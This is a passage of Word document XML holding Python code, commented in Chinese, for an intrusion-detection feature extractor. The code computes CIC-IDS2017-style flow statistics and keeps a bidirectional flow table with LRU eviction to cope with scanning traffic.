          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Avg Bwd Segment Size": (sum(flow.bwd_len) / n_bwd) if n_bwd else 0.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30245264">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Fwd Header Length.1": float(flow.fwd_hdr),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F3A5FEF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        # 这六列在 CIC-IDS2017 里恒为 0（实测），输出 0 才是同一口径</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19F5DC33">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Fwd Avg Bytes/Bulk": 0.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46B134CE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Fwd Avg Packets/Bulk": 0.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45946106">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Fwd Avg Bulk Rate": 0.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69E2D501">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Bwd Avg Bytes/Bulk": 0.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69B01450">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Bwd Avg Packets/Bulk": 0.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EC7BBD9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Bwd Avg Bulk Rate": 0.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F101F29">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Subflow Fwd Packets": float(n_fwd),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BFE9367">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Subflow Fwd Bytes": float(sum(flow.fwd_len)),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06DE0844">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Subflow Bwd Packets": float(n_bwd),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00BFE05E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Subflow Bwd Bytes": float(sum(flow.bwd_len)),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39D77EFF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Init_Win_bytes_forward": float(flow.init_win_fwd),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AE6707C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Init_Win_bytes_backward": float(flow.init_win_bwd),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CC42E50">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "act_data_pkt_fwd": float(flow.act_data_fwd),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43D3DF7B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "min_seg_size_forward": float(flow.min_seg_fwd),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39F5F956">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Active Mean": act_mean,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30EABB63">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Active Std": act_std,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55E53B0E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Active Max": act_max,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5238202E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Active Min": act_min,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BB5A49F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Idle Mean": idl_mean,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BA39AB5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Idle Std": idl_std,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A5E89D9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Idle Max": idl_max,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CADDD56">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Idle Min": idl_min,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D52B290">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BA2A55A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4AB6CF50">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="16A5D0F2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>class FlowTable:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="545E187A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """双向流表：把逐包记录聚成流，按需吐出特征向量。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2629A89B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="72091C7E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    淘汰策略：流数超过上限时踢最久没动的（OrderedDict + move_to_end 实现 LRU）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="424D85B0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    打流量的场景下这一步是必需的——扫描类攻击会瞬间造出上万个只发一个包的流。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="280251C8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31AE618B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3FE374F1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def __init__(self, max_flows: int = 5000, flow_timeout: float = FLOW_TIMEOUT_S):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A382471">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.max_flows = max_flows</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="561AB5B7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.flow_timeout = flow_timeout</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="002F28B1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.flows: OrderedDict = OrderedDict()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="231C8A01">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        self.dropped = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E07FBE2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="322E3D6B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    @staticmethod</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="397411AE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def key_of(rec: PacketRecord) -&gt; tuple:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="770868DE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return (rec.proto, rec.src_ip, rec.src_port, rec.dst_ip, rec.dst_port)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="195C0249">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="60628FD3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    @staticmethod</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05F21B20">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def reverse_of(key: tuple) -&gt; tuple:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56173DB9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        proto, sip, sport, dip, dport = key</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49C31BEC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return (proto, dip, dport, sip, sport)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A2BAC06">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5CD665B7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def add(self, rec: PacketRecord) -&gt; None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74B3EA9F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        key = self.key_of(rec)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24E1588D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        rev = self.reverse_of(key)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CAB5586">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        flow = self.flows.get(key)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A92D9EF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        forward = True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FCF5184">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if flow is None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="408C45C0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            flow = self.flows.get(rev)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="581D0908">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            if flow is not None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20F92BD6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
